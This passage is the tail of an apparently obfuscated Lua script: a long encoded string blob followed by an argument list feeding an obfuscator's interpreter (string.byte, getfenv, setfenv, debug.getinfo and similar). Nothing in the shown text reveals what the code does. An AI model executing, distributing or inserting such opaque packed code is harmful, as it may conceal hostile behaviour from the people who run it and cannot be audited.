RP3DGN3POL3PT63PF83IM33NN93PRW3FCX3POT3PN83PT43PQF3FMC3PKO3AS63PAP3OUZ3MR23G1A3FDX3NBS27D2373PHH3LB226U24825J21C21L26L25D32HW33CA3DOH24V32NS3KW124V3IKI3EA83MSW33463J5031BY23Z28E3AUT23Z32IA3DTV32SJ32IF2A432P83F6G3KC324I27Z3IJV3PU53GMA22R3PHH3MR63L6D3C0R3L6F3C0T3B073MRC3L6J3MRE3C10388T3NZ93ICE3K583E2S3HAG3FPQ3EQL3GOM3E5H3GOO3HGP3AG83DT43EJ03ORV3EW73GNP3IBQ3EL33ILM3DYG3ILO3M6T3FTB3BVT3EEF3A4O3AH83F8J3HTH3NO63PH33OUY3GDK3NBP3PV03L8227D1J3PV43MV43PV63PV83PVA3PVC3K023PVF3PVH2983PVK3L8Q2583PVN3IG93PVP3PVR29L3PVT39XE3DP33PVX32D83PW024O3PW2352032VU3PW53OP33PHH3ONN3HZI3ONQ3FC63IY33KD03ONU27L3IY83GI73C653PWJ3OO03PWL33CC3DTB3PWO3FG13FI03FI73MKH3PWS3F563PWU3G2638563OUW3CW73OVS360M3PX13HVF3DTD3MXW36VZ34N33PX93AQS3PXB3CW63F8K3FO33F5P3OXQ3FL83PXI3KZC3MS837IR3PXN3EK13B4U3PXP3PV93PVB3PVD3FXR3PVG29U3PXW28E3PXY3PY03KF63PY232N63PY43PVU3PY73IK73PVZ3F9D3PW13PW33A5W3PYF3PNZ32243PK43OSN3H983PYT3PRI3IAX3FJI3DYE3BTL3MKM3F4L3PYZ3DQG3FG33E2E3FIL3PZ533DD3PWW3PZ83DFW3C7P3DVT3P943PZD3M573LD63PZG3H7D3PXA3DQZ3PZM3GNL3PZO3P0V3GJ93PZR3NBR3PXK39Z0331Z3PV53PV73PZZ3PXS3PVE32HZ3PXV3PVJ3Q063PVM3JHU332F3Q0A3PVS3Q0D32P03PY83Q0G32OM3Q0I3PYD3FDS332A3PIM331Z3PYI3IXZ3C723ONR3FC73PGF3IY63PYP3ONW3IY93PYS3PLF3I4R3PDY3FCK3Q0V3NCH3HHM3PWP3F7T3GFA3FFM3F4S3Q1433E03Q163MY23PZ93Q193PEH3Q1C3OT93KJL3Q1F3PZI3BTL3PZK2EX3Q1J3HFZ3Q1L3PTK3P0W3FGL3G7L3NBQ3JG82BO26R3Q1S3PXO3Q1U3PXR3Q013G0V3Q033PVI3PXX3Q223PVO3JI33PY33J163Q273PVW3Q0F3FOB3Q0H3PYB3Q0J32ZN3Q2F3HZA26B331Z3JDY3LYV3NH93JE43NHB3LZ03NHD3MRB3NHF3Q0R3PMP3Q0T3GJM3Q2X3MKL3GYP3Q303FAD3Q323FI33PZ43GUZ3PWV3AY13Q173EJ93PX03P7K3Q3C3HEO3M583L3X3PX83AVG3Q1H3CNG3Q3K3HH23Q3M3PD832HU3OUZ3F1I3KDV3M0D3Q3S3P163Q3V3PZW32MM3PZY3Q3Y3PXT3Q1Y3Q043Q203PVL3IFH3PXZ3Q2331633PVQ3Q0B3Q483PY63Q283Q4B386Z3Q4D3PYC3AGX3Q4H3Q0M23N331Z3PW93LSE3PWB3MR93PWD3C0V3L6I3B0A3MRF33VU3O573PLG3PK83F2F3Q4Y339U3Q0X3FD03F9Z3FD23PZ23FG53HVD3EC933DW3Q373PWY3D9K3Q5B3PLX3Q5D3OQ23PX63Q5G3PZH3Q5I3PZJ3Q1I3PXD3OGX3OBI3N7Y3B2Z3PK53B3438QV38R33CG43IWZ3PLZ3NVM3NRG3O3E3F8U3F9L32PV3IYV29F32SH32SJ3CVD32L33A613Q612813Q1Z3Q433Q663Q083MIW3Q253Q0C3Q6D3Q4A3CZ83Q5S3Q3R3M0F3P3W331Z31F03JDZ39WU3MRF3PVF2XS32SE332C32HH3Q902XY3NXT3B1B3DZ43NYH3D493DDD29G3Q2A25B3Q2C32VQ331Z3ADK3J4P2BE3ED73HWD3IW13IYC36QM3JAN35DM3MFM3LZI3BRH3OAR3Q0Z3LE93OGK35NW3K4N37ZP39A03IM53CNZ3BIS3ERV3J803GP43BVP27D3IMU3LE43AXO3G2H3BQC33UA3B0G3AWZ35DI3BUJ3HNN3FZD3CPJ3FW03QA338CU3QA33KJY3NP13IPO3PRX3EVX3APD3PX23EZI3DTD3DNT3MBF3K5F3KMN3KMS2BA3FT83QB63KMP3NV13JR029C33903O6R3FAH3G8Y3I2P3AJY3NWQ3BHQ33C634N33BTI3DND3KNN380Q37FR3BWC38EG3N3Q3MK43EQ031153HLL2FQ3GRQ3BDN335W29I3MOI3BUR3CDM3BWC3E8Q3O703DTH3OII3MZX3QAU3G912BA3C4Q3LGK3DCZ3I2U3CSL3FM23Q7Y39ZL3E243NNL33BY3QAH3ELW35BX3DD83MVE3LBF3MVH3B6L331Z321Q3PY53F8V3L5U32LU3DD93GXT3Q9B24P3C833NRH3IG53M0D3Q863J2S3L6X32SF3DMT32S03NX93DMY3H213DN229L3DN43DMS27M3JZD3Q8B32SM3Q8D2BD2ER3QD23AL129F32KI331X27D22B3Q5W3BER3E3G3IJE3QE23N9W3GQJ3Q9K3F9921V3Q6K3B3K3P403E7Y3QD03MJ13B493J1V3PVU2BO2373QE93N943QEQ3PB3331Z2VH3IKD332C3IKT2453E3G3A3X1R3QES37313QF31B3QF3133QF321N3QF321F3QF32173QF31Z3QF335P832SX25V22N33133QFL3DED3QFN32TH3QFP27C26R3QFR3CO83QFU27A26B3QFW34E13QFZ2433QFZ23V3QFZ23N3QFZ2573QFZ24Z3QFZ24R3QFZ24J3QFL32823JE127J3DUH3LQX3JLA32KI3QGF3K3232R32BO22B3QFZ2233QFZ21V3QFZ23F3QFZ2373QGF3HWA3QFZ335W22R3QFZ1R3QFZ1J3QFZ1B3QFZ133QFZ21N3QFZ2WG32SX2173QFZ1Z3QH222M3QFJ3QHM3DDO32VL3QHM3DED3QHR32TH3QHT3D4W3Q3T3QHV3CO83QHY3QFX3QI034E13QI22433QI23OV038XG3QI223N3QI22573QI224Z3QI224R3QI63OXS27C24J3QI222J3QI222B3QI22233QI221V3QI63P0X3E7Y3QI22373QI222Z3QI222R3QI21R3QI63CL527C1J3QI21B3QI2133QI221N3QI221F3QI63DEE3P6O3A6E3P6Q3P6S3N7I3F253Q2N3F29262268336C39WD3API3AOA3OGD3B713B2H3NC43DB834A43K9V39YV3B7W37GJ2AP26A31OX3AQS3QK72BL36UE3OQ13MZQ3K523A543KKR3K6M3NE038QE3G5H3D8Z3MZ93OHA3F5837A53BRW3GIT396F3NW83HM9339M3BKD3BJP2FQ3P523CS83OQU3AJ731153GTW3B7E3HOO3K9Y3A9537ZP393B3ISR27G3DYE3CSL3MKM27G3NOX3KKG3PX73GJ03AHJ38Y73AYE336U3EIH375P3AB83BMF3OZT3DSO3CZN3DVX3D9G3IRF3BVG2AU3AP93BKW3CPV3IR73QBA3BSA3E9S3ABJ3KQ4321Q3QBE3KOS38JT3QLW3A4O3QLY3QBV338332D83JB53AY33K5V3IWQ33DC3ISQ336N3BA438EG3BGE3E6E3AFY335Y3BKF3BD03DND3KOL3KPR31AL37YE3QBJ3MDI3F7V3F163BKG3N213N1A3N3M3QM83CCI3OCH37YS3N1S3CMM2BT2B439DO3EFB3QNL3QM53QNB3M9V3IO13IU63J8K3M9E3ITD3CDM3BGE3IOG3LJD3BN03D0S3DVX3D0O3BHA3CDM3BJB3IUN3POJ3D7U37PP3OGK3E8Y3BL03CG53NNV3NO23BTL3DC82OK3QAK3CDK3DR837H73MAO3JOA3AG73BIZ3A9U37F337H7312R3L2Z3E6Y3BJP2GD317L385J33MF312R31F038E63A3F2HL3BIL3A9R339U3BIL3JS83APE33CO312R3QOM3AGV3MY13QOQ3QOY3LWY3AEU3QOV3EPL3QOX3BM33QOZ3LFY38PJ2UH3CNZ2UH318433DN3QP23KKS33AH3QP63BIH3CDK37ZP3QPB3KPA3QPD3QOL335V3QON3LDB3QPJ3QPQ3QPL3CS83QPN3CTK3AGV3CSW3QP927B3CSW3OPY2HL3F3C339M312R3D8Z3GTJ3A7T34TL3QPR3D7U37A52GD380E39MR38J531843N2T3CEH31A23K52318X32MQ3QKI38K13QQI31A23ISE3QL62NA3C292HL390Q37ZP3CTV3CMY312R39L93CN13QRP3CDX2HL39OO35R637ZP3QRU37ZP39QV3AEO3QPF33FS2GD3F5S3QOU3D942BT312R3QRZ38CU3QRZ33UO312R3ISM35DM3GA93A4O3QRZ3KPL3CR63KPN3AKE3O6V3PX7359P3P7N3L3S36XJ3PX73LKI3AGW38P13ABC3Q5G3PJR33BR3BHQ38VZ3QM93MCN3K4K3QSX3EIP3QSQ3JUA38WD3QT33OCH3BS53QT639IR3QT83L3V391K3QTB3BGE3CLI3QTE3JUF3K8C3BHQ3NF13MAD3BZE3BGE39V738AD3P2S3QTN3NFM3AY339VC3QTJ3AGW39VE3QTV3QST3PAQ3OHI3JB93G3D3K8C3BGE3BVD3QU43QSY3QU63QT03AY339UQ3QUE3N5939UW3FTI3QTW3LST3QML32P83IT23QUJ3QTS3AGW3QJT3QUD3QT73CEM3BHQ3A7M3QUS33BR3BGE3ITL3AWJ3QUN3FWV3AA03N5Y3LKK3F0L2933K853BTL3QVD3AJY3CPT3A3F2AP3K853OR327A3K853JQ33MO83P2K32P83E9S3QMQ3N4C2VH3ITT3LK83JU338163QVC3DVX3QVF31TR3AHJ37QO3QU1321Q3LKE3AFU3G0L3ORX3BS93BDY3LKG3AFY2VH2XY33DW2AF3QMX3AJ53GQW3MBX3OWF3AY33QN43BGY3BJE3QW93FA934N33FX43DND3QWN380Q37CC3BHQ38JG3QBY3G9G3K8C3BA43IU53MCN3MOE3L7D3A9L3B7A3FU42FQ33TY3JBK3CEM3BDY33W33JBN33V33QXG3K8C3BDY34BC3JBN33WY3AAH3QWW3OZL3QQF3P5B32P837YP3OZY3J8K3BHQ3QVS3QNE3BA43A223QVX3G083O7E39Z83CYJ3QOA3CGE3QVP3QXW3QNR3QXZ3G5V3L3V3QY23CDM3BA43JUV3QY63QVB37OC3BW53FIV2F03CJH380Q31MT3BHQ34C8311Q3QO83N5U3QTG3BHQ34CU3G3U3K4O3BZP3MA83D8Z3AF63BZH3OTH3CBZ3ANO3BVM3QQD33UO2GD3ISM3QS53MY12GD3K5233CR3QOT3AG93DAB3CDK3CRB3AAA3QZD3QKB3CDK3FDR339M2GD3D8Z3J6N3QQV33DU318436BF37A52UH3FQ039MR3A9U31BY37ZP38M83868318X3K522MM31O03QKI318X3QZQ318X3R0D3BM4339U3R0N3QSC3GMY3LMK3BUU3HAT364Y2GD32GC3GJ53R0Y3DJ8312R38PV27933BF37ZP3R133BA52GD3CPT37KS312R38O42793QZT3LJB3BTN339U3R173QZY3BDL33CO2UH3FDR3AOD3R19382B2BT2GD3R1738CU3R173QZG3G9938JA3H3R3H1E3R173CMY2933BPP3CN13R253QVO3O23394Z3QYZ3EBX29334D53IV93QYD3PNG3CM23BA43FU93QC23PD93KTE3EIY32RK3LIC3FX13K8J380B3QN73K9K3QWG39352FQ3NTM3R15339U3NTM3AGL3A2434JS3BA43GNS3BPX3CM23BDY3MF53LWZ3R383R1Y3BVB3QQP3JWR3BZE38J539Q33BNN3QO736BW375P37QX3JRN3QY93ASN3BN83LWI3AGS3CDM3BDY3IE232FL3BA42XY3CFV2FQ32K83R1438713R443AFT3CHI2LE3HLL3F8Q336N3R3G3MUR3L403BAK3K933FGG3AQS32MC381K2UH317L33TY382C2UH3R4L3R0O32Y42F03R3P3BUS3R4N3N4638OL2UH38B833AI2UH2A43CYJ3R553BA53EA033A23QPW3DRE3R503ELE3AHH3FXJ26Z36AS2QR31BY34GV38AV3EFL38JG3BVB38KX3CPO3BVB318X317L3KRF3LUA3BVB37YK3MVE3BVB3AB33MLR385231BY3O7J3QYZ3815364Y2FQ3D3M3GJ53R6A3MC03AAD3R3V3BJE3BDY3FR635RF3R403CZ12FQ39EI3R4537ZP3R6N3R483CEJ3JBF3PXG3K8C3R4E38T53R4G3P3K3BCZ3R4J3BTL2FO3R4M3HWE34KK39Z22UH3R733R4T27A3R7933AI311539E63CYJ3R7F39M4312C3A27378A3R593GIW3JHS3A9Y3CEM3R5J27B34ND385238453B6T3DKG315032MQ34M43BZE38G239Q33R5B3NVM3C4Q3QYZ3J7Q3E6F34N33OIJ3AFY39C83GJ53R8D3R6D3BSN3K9J33A23BDY34NW38P63R6K3CHC2FQ39II3R6O339U3R8Q3R6R3CLY3R6T3F8P3CEM3R6W34OP3QPL3R4H3G3F3R71387139I03R74317L3R763R4Q36IR3EPT37ZP3R963BBH311539HW3CYJ3R9H3R7I3R3Q3R7L3CEM3R843QO127D3R5G3D0I3PVP3R7P3R7V38AX3R7X38L334SP336N3R823K6Z318431O03R8636BW3R883AIP34RX3CMY2FQ39FY3GJ53RAC3R8G3CH53R8I339H3BDY34RF38HP3R8N3DJ82FQ39RE3R8R27B3RAP3R8U3CG23R8W335V3R4C3FTH313T34SF3R913R6Z3AFY3R9437ZP39R03R973FUW3BFX2UH3RB63R7A2633RBB3R7D26339QT3CYJ3RBH3R9K3AE63R9M3K8C3R9O3JXO3R9R38YA31BY34UR3R9Q3ARC38EG391733BR3R7Y27B3ALX33BR3RA13K4Q3RA33R3M3NPX3AS534WZ3R8B2FQ2RN3GJ53RCC3RAF3BZ03RAH3BAJ3EC538OL3RAM3R422631Y2EX3R3027B3RCO38682FQ3R6S3LWI3OOE3CM23R6W350Z3FWS3R923K9K3RB4339U327Q3RB73FY63RB92633RD63RBC3RDB3RBF2193NZF37ZP3RDF37ZD3R7J335V3RBM3DKG3R9O35173CEO3DKG3R7R3EYV3R9U3RDQ3R9W3B0T3RBZ3D3L3R5P3NW23RC43NOT39B83RA63AS5350A3ISR2FQ39TH3GJ53REA3RCF3HHH3RCH3BDY3Q2D3R6J3BD03R4131OX2FQ25E3QK83RCQ381W3QK83BDK3RCV3R4B3R8Y3ECD3D4B3BDY3CD43AGM3ION38JO3QK83R5A3R753RD925O3QK83QRG3RF738042BT311525P3QK838CU3RFE3RDJ3R9L34EK3BZE3R9O3EG03RBQ3RDS29D3RDU3D0I3D5N3K8C3RDY387N3RE038C63RA23RE33PUF3LTW3E6F38D03RAA387L3QK83CSL2653QK83R333R6E2VO3BQ03BDY35883R8M3REJ3R6L34WP3REO38713QKA3RAT3D613RAV3Q5P3REV313T3A7O3MO83RD23DOE3RD43AJX3RF3339H3R4Y3RD83BJH2UH26K3RF838713RH63RFB38G726L3RFF38713RHC3RFI3RBL3RFK33BR3R9O3MV83RFS3RDR3NV83M4738YA3R9V39S33BZE3RFV3F063RA03RE13MK63RC53K5I3R873AS535B53RCA3DJ83DHZ3RGA3QYB3DOC3ET2',{},40,2^16,{},"\115\116\114\105\110\103",'',string.byte,string.char,string.sub,table.concat,(math.ldexp or(function(a,b)return a*(2^b);end)),(getfenv or function()_ENV['\95\69\78\86']=_ENV;return _ENV end),setmetatable,select,next,math.floor,string.format,(unpack or table.unpack),tonumber,table.insert,string.gmatch,tostring,type,_VERSION,pcall,string.match,string.find,(debug.getinfo or debug.info),string.len,rawset,string.gsub,math.random,(table.find or function(a,b)for c,d in next,a do if d==b then return c;end;end return nil;end),rawget,_G,print,setfenv);end;
